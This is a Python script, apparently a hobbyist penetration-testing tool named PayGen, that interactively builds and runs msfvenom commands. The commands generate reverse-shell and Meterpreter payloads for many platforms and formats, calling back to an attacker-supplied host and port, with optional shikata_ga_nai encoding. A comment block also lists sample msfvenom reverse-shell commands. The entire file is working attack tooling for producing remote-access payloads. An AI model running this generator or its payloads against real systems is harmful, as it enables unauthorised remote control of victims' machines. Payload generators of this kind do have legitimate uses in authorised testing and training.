# Date created : 16 - Dec - 2020
# Code : Aniket Nitin Bhagwate - (NullByte007)
# Base tool : Msfvenom

#!/usr/bin/python3
import os

platforms_meterpreter="""
|=================================================|
| (1)  android | (2) java   | (3) linux | (4) osx |
|=================================================| 
| (5)  php     | (6) python | (7) windows         |
|=================================================|
"""

platforms_reverse="""
|============================================================|
|(1)   aix   | (2)  apple     |  (3)  bsd     | (4)  bsdi    |  
|============================================================|
|(5)   cmd   | (6)  firefox   |  (7)  generic | (8)  java    | 
|============================================================|
|(9)  linux  | (10) mainframe |  (11) nodejs  | (12) osx     |
|============================================================|
|(13) python | (14)   r       |  (15) ruby    | (16) solaris | 
|============================================================|
|(17) windows                                                |
|============================================================|
"""


executable_formats = """
|==================================================================================|
| (1) asp      |  (2)  aspx         | (3)  aspx-exe       | (4)  axis2             |
|==================================================================================|
| (5) dll      |  (6)  elf          | (7)  elf-so         | (8)  exe               |
|==================================================================================|
| (9) exe-only |  (10) exe-service  | (11) exe-small      | (12) hta-psh           |
|==================================================================================|
| (13)jar      |  (14) jsp          | (15) loop-vbs       | (16) macho             |
|==================================================================================|
| (17)msi      |  (18) msi-nouac    | (19) osx-app        | (20) psh               |
|==================================================================================|
| (21)psh-cmd  |  (22) psh-net      | (23) psh-reflection | (24) python-reflection |
|==================================================================================|
| (25)vba      |  (26) vba-exe      | (27) vba-psh        | (28) vbs               |
|==================================================================================|
| (29)war                                                                          |
|==================================================================================|
"""

transform_formats ="""
|======================================================================|
| (1)  base32  |  (2)  base64 |  (3)  bash           |  (4)  c         |
|======================================================================|
| (5)  csharp  |  (6)  dw     |  (7)  dword          |  (8)  hex       |
|======================================================================|
| (9)  java    |  (10) js_be  |  (11)  js_le         |  (12)  num      |
|======================================================================|
| (13) perl    |  (14) pl     |  (15)  powershell    |  (16)  ps1      |
|======================================================================|
| (17) py      |  (18) python |  (19)  raw           |  (20)  rb       |
|======================================================================|
| (21) ruby    |  (22) sh     |  (23)  vbapplication |  (24)  vbscript |
|======================================================================|
"""



# Global variables: 
shell_type = ""
platform = ""
lhost = ""
lport = ""
encoder = ""
arch = ""
bad_chars = "" 
exit_mode = ""
exp_format =""
pay_name =""
command=""
'''
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.13 lport=1234 -f aspx -o shell.aspx
command :  msfvenom -p java/shell_reverse_tcp lhost=10.10.14.14 lport=5555 -f war -o shell2.war

met : 
linux , osx, windows

rev : 
bsd, linux , osx, windows

'''

def show_banner():
    global shell_type 
    global platform 
    global lhost 
    global lport 
    global encoder 
    global arch 
    global bad_chars
    global exit_mode
    global exp_format
    global pay_name  


    os.system("clear")
    print(f"""                
|=====================================|
|  ____              ____             |
| |  _ \ __ _ _   _ / ___| ___ _ __   |
| | |_) / _` | | | | |  _ / _ \ '_ \  |
| |  __/ (_| | |_| | |_| |  __/ | | | |
| |_|   \__,_|\__, |\____|\___|_| |_| |
|             |___/                   |              
|=====================================|
|    REVERSE SHELL / METERPRETER      |
|=====================================|
| Code: Aniket Bhagwate (NullByte007) |
|=====================================|

==> CURRENT OPTIONS:
[================================================]
[-] SHELL TYPE      :  \033[1;4m {shell_type} \033[0m                               
[-] PLATFORM        :  \033[1;4m {platform} \033[0m                                  
[-] LHOST           :  \033[1;4m {lhost} \033[0m                                     
[-] LPORT           :  \033[1;4m {lport} \033[0m                                    
[-] ENCODER         :  \033[1;4m {encoder} \033[0m 
[-] ARCHITECTURE    :  \033[1;4m {arch} \033[0m                                     
[-] BAD CHARS       :  \033[1;4m {bad_chars} \033[0m                          
[-] EXITTHREAD MODE :  \033[1;4m {exit_mode} \033[0m                           
[-] EXPORT FORMAT   :  \033[1;4m {exp_format} \033[0m                           
[-] PAYLOAD NAME    :  \033[1;4m {pay_name} \033[0m                                 
[================================================]
""")

def PayGen(shell,platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name): 
    global command
    reverse_shell= {"aix" : "aix/ppc/shell_reverse_tcp" ,"apple" : "apple_ios/aarch64/shell_reverse_tcp" ,"bsd" :"bsd/x86/shell_reverse_tcp" ,"bsdi" :"bsdi/x86/shell_reverse_tcp","cmd" :"cmd/windows/powershell_reverse_tcp","firefox" :"firefox/shell_reverse_tcp","generic" :"generic/shell_reverse_tcp","java" :"java/shell_reverse_tcp","linux" :"linux/x86/shell_reverse_tcp","mainframe" :"mainframe/shell_reverse_tcp","nodejs" :"nodejs/shell_reverse_tcp","osx" :"osx/x86/shell_reverse_tcp","python" :"python/shell_reverse_tcp","r" :"r/shell_reverse_tcp","ruby" :"ruby/shell_reverse_tcp","solaris" :"solaris/x86/shell_reverse_tcp","windows" :"windows/shell_reverse_tcp"}
    meterpreter_shell = {"android" : "android/meterpreter/reverse_tcp","java" : "java/meterpreter/reverse_tcp","linux" : "linux/x86/meterpreter/reverse_tcp","osx" : "osx/x64/meterpreter/reverse_tcp","php" : "php/meterpreter/reverse_tcp","python" : "python/meterpreter/reverse_tcp","windows" : "windows/meterpreter/reverse_tcp"}
    
    def rev_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name):
        global command
        command = "msfvenom " + "-p " + reverse_shell[platform] + " --platform " + platform + " lhost=" +lhost+ " lport=" + lport 

    def met_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name):
        global command
        command = "msfvenom " + "-p " + meterpreter_shell[platform] + " --platform " + platform + " lhost=" +lhost+ " lport=" + lport     
    
    
    #print(f"{shell},{platform},{lhost}, {lport} , {encoder} , {arch} , {bad_chars}, {exit_mode}, {exp_format}, {pay_name}")

    if shell =='1':
        rev_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name)
    elif shell =='2':
        met_shell_function(platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name)

    # adding encoder
    if encoder != "N/A":
        command += " -e " + encoder
    else:
        pass

    # adding architecture
    command += " -a " +  arch

    # adding bad chars
    if bad_chars != "N/A":
        command += " -b " + "'" + bad_chars + "'"
    else:
        pass

    # adding exit mode
    if exit_mode=="ENABLED":
        command += " EXITFUNC=thread"
    elif exit_mode=="DISABLED":
        pass

    command += " -f" + exp_format.split(":")[1] + " -o " + pay_name
    show_banner()
    print("\033[30;42;5m [#] GENERATED COMMAND \033[m : " + command)
    print("\n [~] BUILDING .......... \n")
    os.system(command)
    print("\n\033[30;42;5m [#] GENERATED PAYLOAD  \033[m  : " + "\033[30;42;5m " + pay_name + " \033[m")

    

def main():
    global shell_type
    global platform 
    global lhost 
    global lport 
    global encoder 
    global arch 
    global bad_chars 
    global exit_mode 
    global exp_format
    global pay_name

    var =''
    show_banner()

    # TYPE OF SHELL BLOCK ! --------------------------

    inp = input("[*] TYPE OF SHELL REQUIRED : ( REVERSE (R) / METERPRETER (M) ) : ").lower()
    if inp == 'r' or inp =='reverse':
        var='1'
    elif inp =='m' or inp =='meterpreter':
        var='2'
    else:
        input("[!] INVALID SELECTION ! .. SELECT AN APPROPRIATE SHELL TYPE ! <PRESS ENTER>")
        exit()

    if var=='1':
        shell_type="REVERSE SHELL"
    elif var=='2':
        shell_type="METERPRETER SHELL"
    show_banner()
    # ---------------------------------------------------


    # PLATFORM SELECTION BLOCK ! ------------------------
    pf_met = ["android","java","linux","osx","php","python","windows"]
    pf_rev = ["aix","apple","bsd","bsdi","cmd","firefox","generic","java","linux","mainframe","nodejs","osx","python","r","ruby","solaris","windows"]
    
    if var =='1':
        print("[*] AVAILABLE PLATFORMS : ")
        print(platforms_reverse)
        inp = int(input("[*] TYPE OF PLATFORM REQUIRED : "))
        platform = pf_rev[inp-1]

    elif var=='2':
        print("[*] AVAILABLE PLATFORMS : ")
        print(platforms_meterpreter)
        inp = int(input("[*] TYPE OF PLATFORM REQUIRED : "))
        platform = pf_met[inp-1]
    show_banner()
    # ---------------------------------------------------

    # Lhost and lport selection ! -----------------------
    lhost = input("[*] ENTER THE LOCAL HOST IP : ")
    lport = input("[*] ENTER THE LOCAL PORT TO CONNECT : ")
    show_banner()
    # ---------------------------------------------------

    # Encoder selection ! --------------------------------
    inp = input("[!] DO YOU WISH TO USE AN ENCODER ? (Y / N (DEFAULT) ) :  ").lower()
    if inp=="y" or inp=="yes":
        print("[!] SELECTING => x86/shikata_ga_nai (DEFAULT)")
        encoder="x86/shikata_ga_nai"
    elif inp=="n" or inp=="no":
        encoder="N/A"
    else:
        encoder="N/A"

    show_banner()
    # ---------------------------------------------------
    
    
    # Architecture selection ! ---------------------------
    inp = input("[*] WHICH ARCHITECTURE DO YOU NEED : ( x86 (DEFAULT) / x64 ) : ").lower()
    if inp =="x86":
        arch = "x86"
    elif inp =="x64":
        arch = "x64"
    else:
        arch = "x86"
    show_banner()
    # ---------------------------------------------------

    # Bad chars 
    inp = input("[*] DO YOU WANT TO DECLARE ANY BAD CHARACTERS ? (Y / N (DEFAULT) ) : ").lower()
    if inp=="y" or inp =="yes":
        bad_chars = input("[*] ENTER THE BAD CHARACTERS : ")
    elif inp=="n" or inp=="no":
        bad_chars = "N/A"
    else:
        bad_chars = "N/A"
    show_banner() 
    # ---------------------------------------------------


    # EXIT_THREAD mode
    inp = input("[*] DO YOU WANT TO ENABLE THE EXITTHREAD MODE ? (Y / N (DEFAULT) ) : ").lower()
    if inp=="y" or inp =="yes":
        exit_mode = "ENABLED"
    elif inp=="n" or inp=="no":
        exit_mode = "DISABLED"
    else:
        exit_mode = "DISABLED"
    show_banner()
    # ---------------------------------------------------

    # Export format
    eformats=["asp","aspx","aspx-exe","axis2","dll","elf","elf-so","exe","exe-only","exe-service","exe-small","hta-psh","jar","jsp","loop-vbs","macho","msi","msi-nouac","osx-app","psh","psh-cmd","psh-net","psh-reflection","python-reflection","vba","vba-exe","vba-psh","vbs","war"]
    tformats=["base32","base64","bash","c","csharp","dw","dword","hex","java","js_be","js_le","num","perl","pl","powershell","ps1","py","python","raw","rb","ruby","sh","vbapplication","vbscript"]
    inp = input("[*] WHAT DO YOU WANT THE EXPORT TO BE EXECUTABLE OR TRANSFORM (E/T) : ").lower()
    if inp=="e" or inp =="executable":
        print(executable_formats)
        inp = int(input("[*] SELECT THE EXECUTABLE FORMAT :  ")) 
        ft = eformats[inp-1]
        exp_format = "executable : " + ft
    
    elif inp=="t" or inp=="transform":
        print(transform_formats)
        inp = int(input("[*] SELECT TRANSFORM FORMAT : "))
        ft = tformats[inp-1]
        exp_format = "transform : " + ft
    else:
        input("[!] INVALID FORMAT !! .. SELECT AN APPROPRIATE FORMAT ! <PRESS ENTER>")
        exit()
    show_banner()
    # ---------------------------------------------------


    # Payload name
    inp = input("[*] ENTER THE OUTPUT FILE NAME WITH EXTENSION : ")
    pay_name = inp
    show_banner()
    # ----------------------------------------------------

    # Building function call ! 
    PayGen(var,platform,lhost,lport,encoder,arch,bad_chars,exit_mode,exp_format,pay_name)
  
if __name__ == "__main__":
    try:
        main()
    except:
        os.system("clear")
        print("[!!!] INTERRUPTED !!! ")